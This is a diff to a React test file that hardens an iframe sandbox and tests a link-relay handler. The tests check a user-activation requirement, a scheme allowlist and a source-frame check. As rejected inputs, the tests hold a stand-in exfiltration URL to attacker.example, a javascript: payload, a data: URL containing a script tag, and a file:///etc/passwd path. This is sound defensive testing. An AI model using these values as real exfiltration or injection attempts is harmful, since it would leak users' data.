@@ -1,4 +1,4 @@
-import { afterEach, describe, expect, test } from "bun:test";
+import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { cleanup, render, waitFor } from "@testing-library/react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { MemoryRouter } from "react-router";
@@ -49,10 +49,12 @@ describe("VisualSurface", () => {
 
     // THEN the iframe is sandboxed without same-origin access and referrer-free
     expect(rendered).toContain("<iframe");
-    expect(rendered).toContain(
-      'sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"',
-    );
+    expect(rendered).toContain('sandbox="allow-scripts"');
     expect(rendered).not.toContain("allow-same-origin");
+    // …and without popup tokens: a popup is a top-level navigation, which the
+    // embedder's `frame-src` cannot constrain, so it would be an egress
+    // channel out of a document that is otherwise denied all network access.
+    expect(rendered).not.toContain("allow-popups");
     expect(rendered).toContain('referrerPolicy="no-referrer"');
     expect(rendered).toContain('title="A diagram"');
     // …and srcdoc carries the widget markup (HTML-escaped inside the attribute)
@@ -179,5 +181,110 @@ describe("VisualSurface", () => {
     expect(renderSurface(surface({}))).toBe("");
     expect(renderSurface(surface({ html: "" }))).toBe("");
     expect(renderSurface(surface({ html: 42 }))).toBe("");
+  });
+});
+
+describe("VisualSurface link relay", () => {
+  const originalOpen = window.open;
+  let opened: string[];
+
+  /** Mount the surface and hand back its frame, so a relayed message can
+   *  carry the `source` the parent checks. */
+  function mountFrame(): HTMLIFrameElement {
+    const { container } = render(
+      <MemoryRouter>
+        <VisualSurface surface={surface({ html: "<div>widget</div>" })} />
+      </MemoryRouter>,
+    );
+    const frame = container.querySelector("iframe");
+    if (!frame) {
+      throw new Error("expected the visual surface to render a frame");
+    }
+    return frame;
+  }
+
+  function relayLink(frame: HTMLIFrameElement, href: unknown): void {
+    const event = new MessageEvent("message", {
+      data: { type: "vellum_open_link", frameId: "surface-visual-1", href },
+    });
+    // `source` is readonly on the constructed event, and happy-dom does not
+    // honour it from the init dict.
+    Object.defineProperty(event, "source", { value: frame.contentWindow });
+    window.dispatchEvent(event);
+  }
+
+  function setUserActivation(isActive: boolean): void {
+    Object.defineProperty(navigator, "userActivation", {
+      value: { isActive, hasBeenActive: isActive },
+      configurable: true,
+    });
+  }
+
+  beforeEach(() => {
+    opened = [];
+    window.open = ((url?: string | URL) => {
+      opened.push(String(url));
+      return null;
+    }) as typeof window.open;
+    setUserActivation(true);
+  });
+
+  afterEach(() => {
+    window.open = originalOpen;
+  });
+
+  test("opens a relayed external link on the host", () => {
+    // GIVEN a widget whose link click was relayed rather than opened in-frame
+    const frame = mountFrame();
+
+    // WHEN the relay arrives under an active user activation
+    relayLink(frame, "https://example.com/docs");
+
+    // THEN the host opens it, so Electron and Capacitor route it through their
+    // own external-browser handling instead of the sandbox opening it raw.
+    expect(opened).toEqual(["https://example.com/docs"]);
+  });
+
+  test("ignores a relay with no user activation", () => {
+    // A widget reads its own frameId and can post on load or in a loop, so the
+    // click is the only thing separating a link the user asked for from markup
+    // phoning home.
+    const frame = mountFrame();
+    setUserActivation(false);
+
+    relayLink(frame, "https://attacker.example/leak?d=secret");
+
+    expect(opened).toEqual([]);
+  });
+
+  test("refuses schemes outside the link allowlist", () => {
+    const frame = mountFrame();
+
+    for (const href of [
+      "javascript:alert(1)",
+      "data:text/html,<script>x</script>",
+      "file:///etc/passwd",
+      "blob:https://example.com/abc",
+    ]) {
+      relayLink(frame, href);
+    }
+
+    expect(opened).toEqual([]);
+  });
+
+  test("ignores a relay from anything but its own frame", () => {
+    const frame = mountFrame();
+    const event = new MessageEvent("message", {
+      data: {
+        type: "vellum_open_link",
+        frameId: "surface-visual-1",
+        href: "https://attacker.example/leak",
+      },
+    });
+    Object.defineProperty(event, "source", { value: window });
+    window.dispatchEvent(event);
+
+    expect(opened).toEqual([]);
+    expect(frame).toBeTruthy();
   });
 });
